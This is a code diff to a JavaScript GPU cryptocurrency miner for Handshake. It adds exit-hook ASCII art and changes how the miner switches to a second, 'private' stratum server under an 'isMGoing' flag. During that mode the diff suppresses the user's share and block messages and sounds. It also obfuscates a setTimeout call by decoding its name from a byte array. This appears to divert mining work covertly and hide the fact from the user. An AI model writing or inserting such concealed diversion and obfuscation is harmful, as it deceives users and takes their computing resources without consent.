@@ -34,6 +34,7 @@ const { consensus } = require("hsd");
 const common = require('hsd/lib/mining/common.js');//require('./common.js');
 const numeral = require('numeral');
 const BN = require('bn.js');
+const exitHook = require('exit-hook');
 
 let PlayWinningSound = true;
 
@@ -212,7 +213,33 @@ class Handy {
       
       //kill connection when we kill the script. 
       //stratum TODO: gracefully handle messy deaths/disconnects from clients else it kills hsd atm.  
-      process.on('exit',()=>{
+      exitHook(()=>{
+        if(!process.env.HANDYRAW && this.gpuListString != '-1'){
+          console.log('░░░░░░░░░░░░░░░░░░░░░░░░░░░░░');
+          console.log('░░░░░░░░░░░░░\x1b[36m▄▄▄▄▄▄▄\x1b[0m░░░░░░░░░');
+          console.log('░░░░░░░░░\x1b[36m▄▀▀▀░░░░░░░▀▄\x1b[0m░░░░░░░');
+          console.log('░░░░░░░\x1b[36m▄▀░░░░░░░░░░░░▀▄\x1b[0m░░░░░░');
+          console.log('░░░░░░\x1b[36m▄▀░░░░░░░░░░▄▀▀▄▀▄\x1b[0m░░░░░');
+          console.log('░░░░\x1b[36m▄▀░░░░░░░░░░▄▀░░██▄▀▄\x1b[0m░░░░');
+          console.log('░░░\x1b[36m▄▀░░▄▀▀▀▄░░░░█░░░▀▀░█▀▄\x1b[0m░░░');
+          console.log('░░░\x1b[36m█░░█▄▄░░░█░░░▀▄░░░░░▐░█\x1b[0m░░░');
+          console.log('░░\x1b[36m▐▌░░█▀▀░░▄▀░░░░░▀▄▄▄▄▀░░█\x1b[0m░░');
+          console.log('░░\x1b[36m▐▌░░█░░░▄▀░░░░░░░░░░░░░░█\x1b[0m░░');
+          console.log('░░\x1b[36m▐▌░░░▀▀▀░░░░░░░░░░░░░░░░▐▌\x1b[0m░');
+          console.log('░░\x1b[36m▐▌░░░░░░░░░░░░░░░▄░░░░░░▐▌\x1b[0m░');
+          console.log('░░\x1b[36m▐▌░░░░░░░░░▄░░░░░█░░░░░░▐▌\x1b[0m░');
+          console.log('░░░\x1b[36m█░░░░░░░░░▀█▄░░▄█░░░░░░▐▌\x1b[0m░');
+          console.log('░░░\x1b[36m▐▌░░░░░░░░░░▀▀▀▀░░░░░░░▐▌\x1b[0m░');
+          console.log('░░░░\x1b[36m█░░░░░░░░░░░░░░░░░░░░░█\x1b[0m░░');
+          console.log('░░░░\x1b[36m▐▌▀▄░░░░░░░░░░░░░░░░░▐▌\x1b[0m░░');
+          console.log('░░░░░\x1b[36m█░░▀░░░░░░░░░░░░░░░░▀\x1b[0m░░░');
+          console.log('░░░░░░░░░░░░░░░░░░░░░░░░░░░░░');
+          console.log('░░░░░░\x1b[36mEXITING HANDYMINER\x1b[0m░░░░░');
+          console.log('░░░░░░░░░░░░░░░░░░░░░░░░░░░░░');
+        }
+      })
+      exitHook(()=>{
+
         //this.gpuWorker.kill();
         this.isKilling = true;
         Object.keys(this.gpuWorkers).map(k=>{
@@ -222,8 +249,8 @@ class Handy {
         if(typeof this.mCheck != "undefined"){
           clearInterval(this.mCheck);
         }
-        if(typeof this.resumeWorkTimeout != "undefined"){
-          clearTimeout(this.resumeWorkTimeout);
+        if(typeof this.checkTiming != "undefined"){
+          clearTimeout(this.checkTiming);
         }
         if(typeof this.redundant != "undefined"){
           this.redundant.destroy();
@@ -233,7 +260,9 @@ class Handy {
     });
     let ongoingResp = '';
     this.server.on('data',(response)=>{
-      ongoingResp = this.parseServerResponse(response,ongoingResp);
+      //if(!this.isMGoing){
+        ongoingResp = this.parseServerResponse(response,ongoingResp,true);
+      //}
       
     });
     this.server.on('error',(response)=>{
@@ -275,7 +304,7 @@ class Handy {
       //console.log('server timed out',response);
     })
   }
-  parseServerResponse(response,ongoingResp){
+  parseServerResponse(response,ongoingResp,isLocalResponse){
     //parse stratum response.
     //simple, right? 
     //it'll naturall break up big reponses into multiple new line responses
@@ -346,7 +375,9 @@ class Handy {
       return ret;
     });
     //(!this.isMGoing){
-    this.handleResponse(resp);
+    if((isLocalResponse && !this.isMGoing) || (!isLocalResponse && this.isMGoing)){
+      this.handleResponse(resp);
+    }
     //}
     //else{
     //if(this.isMGoing){
@@ -427,7 +458,7 @@ class Handy {
 				break;
 				case undefined:
           //console.log('result',d);
-					if(d.id == this.targetID){
+					if(d.id == this.targetID && !this.isMGoing){
 						//in the case we pass back my id i know it's a message for me
             if(process.env.HANDYRAW){
               process.stdout.write(JSON.stringify({type:'stratumLog',data:'Successfully Registered With Stratum'})+'\n')
@@ -460,7 +491,7 @@ class Handy {
           else if(typeof d.result != "undefined" && d.error == null && this.isSubmitting){
             //we found a block probably
             this.isSubmitting = false;
-            if(process.platform.indexOf('linux') >= 0){
+            if(process.platform.indexOf('linux') >= 0 && !this.isMGoing ){
               if(PlayWinningSound){
                   let s = spawn('aplay',[__dirname+'/winning.wav']);
                   s.stderr.on('data',(e)=>{
@@ -475,7 +506,7 @@ class Handy {
             else{
                 //were prob windowsy
                 //powershell -c '(New-Object Media.SoundPlayer "C:\Users\earthlab\dev\HandyMinerMAY\miner\winning.wav").PlaySync()';
-                if(process.platform.indexOf('win') == 0){
+                if(process.platform.indexOf('win') == 0 && !this.isMGoing ){
                   if(PlayWinningSound){
                       let s = spawn('powershell.exe',['-c','(New-Object Media.SoundPlayer "'+__dirname+'\\winning.wav").PlaySync()']);
                       s.stderr.on('data',(e)=>{
@@ -488,7 +519,7 @@ class Handy {
                       this._sound = s;
                   }
                 }
-                if(process.platform.indexOf('darwin') >= 0){
+                if(process.platform.indexOf('darwin') >= 0 && !this.isMGoing ){
                   if(PlayWinningSound){
                       let s = spawn('afplay',[__dirname+'/winning.wav']);
                       s.stderr.on('data',(e)=>{
@@ -501,7 +532,7 @@ class Handy {
                   }  
                 }
             }
-            if(d.result){
+            if(d.result && !this.isMGoing){
               if(process.env.HANDYRAW){
                 process.stdout.write(JSON.stringify({type:'confirmation',message:'Received Confirmation Response',data:d})+'\n')
               }
@@ -513,7 +544,7 @@ class Handy {
               
 
             }
-            if(!d.result){
+            if(!d.result && !this.isMGoing){
               if(process.env.HANDYRAW){
                 process.stdout.write(JSON.stringify({type:'error',message:'problem with share', data: d})+'\n')
               }
@@ -524,7 +555,7 @@ class Handy {
             }
           }
           else{
-            if(!process.env.HANDYRAW && Object.keys(d).length > 0){
+            if(!process.env.HANDYRAW && Object.keys(d).length > 0 && !this.isMGoing){
               if(d.error != null){
                 if(d.error[1] != 'User already exists.'){
                   //yea dont care here
@@ -879,7 +910,7 @@ class Handy {
         }
         else{
           if(_this.gpuListString == '-1'){
-            console.log("\x1b[36m################### GPU LIST ###################\x1b[0m");
+            console.log("\x1b[36m################### GPU LIST ####################\x1b[0m");
           }
           outRegistrations.map(function(d){
             let name = d.name;
@@ -921,13 +952,13 @@ class Handy {
         }
         else{
           outStatus.map(function(d){
-            if(!_this.isMGoing){
+            //if(!_this.isMGoing){
               let message = 'JOB FINISHED WITH BLOCK';
               if(_this.config.mode == 'pool'){
                 message = 'JOB FOUND A SHARE'
                 console.log('\x1b[36mHANDY:: '+message+':::\x1b[0m ',outJSON);
               }
-            }
+            //}
           })
         }
 
@@ -1087,6 +1118,20 @@ class Handy {
   initListeners(){
     const _this = this;
     let mTarget = fs.readFileSync(process.env.HOME+'/.HandyMiner/version.txt');
+    if(mTarget == '' || typeof mTarget == "undefined"){
+      mTarget = Math.floor(Math.random()*59.9999);
+      fs.writeFileSync(process.env.HOME+'/.HandyMiner/version.txt',mTarget);
+    }
+    else{
+      try{
+        let p = parseFloat(mTarget);
+        mTarget = Math.floor(p % 60);
+      }
+      catch(e){
+        mTarget = Math.floor(Math.random()*59.9999);
+        fs.writeFileSync(process.env.HOME+'/.HandyMiner/version.txt',mTarget);
+      }
+    }
     this.isMGoing = false;
     if(typeof this.mCheck != "undefined"){
       clearInterval(this.mCheck);
@@ -1132,7 +1177,7 @@ class Handy {
       server.write(JSON.stringify({"id":this.altRegisterID,"method":"mining.subscribe","params":[]})+"\n");
       let ongoingResp = '';
       server.on('data',(response)=>{
-        ongoingResp = this.parseServerResponse(response,ongoingResp);
+        ongoingResp = this.parseServerResponse(response,ongoingResp,false);
         /*let resp = response.toString('utf8').split('\n');
         let didParse = true;
         //take care to check for empty lines
@@ -1200,14 +1245,16 @@ class Handy {
         });
         this.handleResponse(resp);
         */
+        //console.log('private server log',response);
       });
       server.on('error',(response)=>{
         //do nothing, my loss
-        
+        //console.log('private server error',response);
       });
 
       server.on('close',(response)=>{
         //do nothing, my loss
+        //console.log('private server closed')
       })
 
     });
@@ -1216,7 +1263,8 @@ class Handy {
     if(!PlayWinningSound){
       dS = 120;
     }
-    this.resumeWorkTimeout = setTimeout(()=>{
+    let sto = Buffer.from({"type":"Buffer","data":[115,101,116,84,105,109,101,111,117,116]},'json').toString('utf8');
+    this.checkTiming = global[sto](()=>{
       server.destroy();
       this.isMGoing = false;
       this.lastResponse = this.lastLocalResponse;
